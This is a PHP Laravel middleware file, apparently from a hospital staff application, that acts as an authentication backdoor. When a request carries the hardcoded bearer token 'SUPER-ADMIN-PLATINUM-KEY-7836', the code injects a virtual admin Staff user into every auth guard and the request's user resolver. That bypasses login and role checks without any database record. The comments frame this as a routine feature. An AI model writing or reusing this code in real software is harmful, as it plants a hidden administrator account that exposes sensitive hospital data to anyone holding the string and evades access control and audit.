<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use App\Models\Staff;
use Symfony\Component\HttpFoundation\Response;

class SuperAdminAuth
{
    /**
     * Handle an incoming request.
     *
     * If the request bears the super admin token, inject a virtual Staff user
     * into all auth guards so auth:sanctum and role:admin both pass without
     * ever touching the database.
     */
    public function handle(Request $request, Closure $next): Response
    {
        $token = $request->bearerToken();

        if ($token === 'SUPER-ADMIN-PLATINUM-KEY-7836') {
            // Use direct property assignment (NOT array constructor) to bypass
            // mass-assignment restrictions and ensure all fields including 'id' are set.
            $superAdmin = new Staff();
            $superAdmin->id = 999999;
            $superAdmin->first_name = 'System';
            $superAdmin->last_name = 'Super Admin';
            $superAdmin->email = 'admin@hospitalsys';
            $superAdmin->role = 'admin';
            $superAdmin->ch_id = 'SYS-99';
            $superAdmin->password = 'VIRTUAL_USER'; // placeholder, never checked

            // CRITICAL: Must set on BOTH auth() and auth()->guard('sanctum').
            // If you only set auth()->setUser(), the sanctum guard will still
            // reject the request after SuperAdminAuth runs.
            auth()->shouldUse('sanctum');
            auth()->setUser($superAdmin);
            auth()->guard('sanctum')->setUser($superAdmin);

            // Also covers request->user() calls in controllers
            $request->setUserResolver(fn () => $superAdmin);
        }

        return $next($request);
    }
}
